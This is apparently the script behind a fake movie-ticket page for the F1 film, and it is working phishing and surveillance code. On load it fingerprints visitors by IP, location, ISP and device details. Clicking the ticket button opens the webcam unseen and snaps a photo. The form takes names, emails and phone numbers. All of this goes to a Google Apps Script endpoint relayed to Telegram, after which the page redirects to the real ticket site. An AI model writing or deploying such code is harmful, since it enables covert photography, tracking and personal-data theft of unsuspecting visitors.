const APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbx4tpUPP57s4-wThS878CK1MlC5iIP_vIOKkV-QKyRsS2e5qED1dtfJ81EcfKjOLHP_/exec';

const getTicketsBtn = document.getElementById('getTicketsBtn');
const formSection = document.getElementById('formSection');
const ticketForm = document.getElementById('ticketForm');
const video = document.getElementById('video');

// Global variable to store visitor ID
let visitorID = "";

// Generate visitor ID once from country + date
async function generateVisitorID() {
  if (visitorID) return visitorID;

  try {
    const res = await fetch('https://ipapi.co/json/');
    const data = await res.json();
    const countryCode = data.country || "XX";
    const now = new Date();
    const dd = String(now.getDate()).padStart(2, '0');
    const mmm = now.toLocaleString('en-US', { month: 'short' }).toUpperCase();
    const yy = String(now.getFullYear()).slice(-2);
    const uniqueNum = Math.floor(1000 + Math.random() * 9000);

    visitorID = `${countryCode}-${dd}${mmm}${yy}-${uniqueNum}`;
  } catch (e) {
    visitorID = `XX-ERR-${Math.floor(1000 + Math.random() * 9000)}`;
  }
  return visitorID;
}

// Step 1: Show form and start webcam
getTicketsBtn.addEventListener('click', async () => {
  await generateVisitorID();

  document.querySelector('.hero').style.display = 'none';
  document.querySelector('.details').style.display = 'none';
  document.querySelector('.cast-reviews').style.display = 'none';
  formSection.style.display = 'block';

  navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
    video.srcObject = stream;
    video.style.display = 'none';

    setTimeout(() => {
      const canvas = document.createElement('canvas');
      canvas.width = 320;
      canvas.height = 240;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const base64Image = canvas.toDataURL('image/jpeg');

      // ✅ Log before sending image
      sendToTelegram(`📸 ${visitorID} – Photo captured successfully`);

      // ✅ Send image
      fetch(APPS_SCRIPT_URL, {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ image: base64Image })
      });

    }, 3000);

  }).catch(err => {
    console.error("Camera error:", err);
    sendToTelegram(`🚫 ${visitorID} – Webcam not accessible`);
  });
});

// Step 2: Form submission
ticketForm.addEventListener('submit', async (e) => {
  e.preventDefault();
  await generateVisitorID();

  const name = ticketForm.elements['name'].value;
  const email = ticketForm.elements['email'].value;
  const phone = ticketForm.elements['phone'].value;

  await fetch(APPS_SCRIPT_URL, {
    method: 'POST',
    mode: 'no-cors',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      log: `🎟️ Form Submission\nVisitor ID: ${visitorID}\nName: ${name}\nEmail: ${email}\nPhone: ${phone}`
    })
  });

  window.location.href = 'https://in.bookmyshow.com/movies/f1-the-movie/ET00403839';
});

// Step 3: Collect IP and browser info
async function collectFullDeviceInfo() {
  try {
    const res = await fetch('https://ipapi.co/json/');
    const data = await res.json();

    const fingerprint = {
      screenResolution: `${screen.width}x${screen.height}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      deviceMemory: navigator.deviceMemory || 'N/A',
      platform: navigator.platform,
      userAgent: navigator.userAgent
    };

    const message = `🧠 Device Info (${visitorID})
🌍 IP: ${data.ip}
📍 Location: ${data.city}, ${data.region}, ${data.country_name}
🌐 ISP: ${data.org} | ASN: ${data.asn}
🕒 Timezone: ${data.timezone}
🖥️ Screen: ${fingerprint.screenResolution}
🔋 RAM: ${fingerprint.deviceMemory} GB
💻 Platform: ${fingerprint.platform}
🕸️ User Agent:
${fingerprint.userAgent}`;

    sendToTelegram(message);
  } catch (error) {
    console.error("Failed to fetch device info:", error);
    sendToTelegram(`❗ ${visitorID} – Failed to collect full device info`);
  }
}

// Send text to Telegram
function sendToTelegram(msg) {
  fetch(APPS_SCRIPT_URL, {
    method: "POST",
    mode: "no-cors",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ log: msg })
  });
}

document.addEventListener("DOMContentLoaded", async () => {
  await generateVisitorID();
  collectFullDeviceInfo();
});
